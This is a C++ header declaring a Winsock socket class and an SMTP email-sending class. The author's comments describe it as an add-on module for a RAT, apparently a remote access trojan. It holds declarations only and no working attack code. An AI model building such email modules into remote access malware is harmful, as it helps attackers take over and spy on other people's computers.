#ifndef EMAIL_H
#define EMAIL_H
//The email class makes its own sockets and destroys them. I kind want to encapsulate this function away from the RAT itself, but just have it as
//an added on feature for funz
//I dont really use the socketclass.h/.cpp for the RAT itself. I dont think its a good idea.

#include <string>
#include <windows.h>
#include <sstream>
#include <winsock2.h>
#include <iostream>

using std::string;


class socketclass{

    private:

        string ipaddress;
        int portnumber;
        WSADATA wsa; //winsock
        SOCKET sa; //handle to socket
        struct sockaddr_in server;
        int buffersize;


    public:

        socketclass(string, int, int);
        socketclass();
        ~socketclass();

        char read_socket();
        int send_socket(string);
        int connectsocket();

        void initsocket();
        void endsocket();
        void setsocket(string, int);
        void changebuffersize(int);



};


class email : public socketclass
{
    public:

        email();
        email(string, string); //set email user and password
        email(string, string, string, string, string, string); // email user, password, from, to, subject, message
        email(string, int, string, string, string, string, string, string); //set ip and port, then email info
        ~email();

        int  sendmail();
        void setemailuser(string);
        void setemailpasswd(string);
        void setemailfrom(string);
        void setemailto(string);
        void setemailsubj(string);
        void setemailmessage(string);


    private:

            string ehlo;
            string authloginuser;
            string passwd;
            string mailfrom;
            string rcptto;
            string datacmd;
            string data;
            string quit;

        string emailuser;
        string emailpasswd;
        string emailfrom;
        string emailto;
        string emailsubj;
        string emailmessage;

};

#endif // EMAIL_H
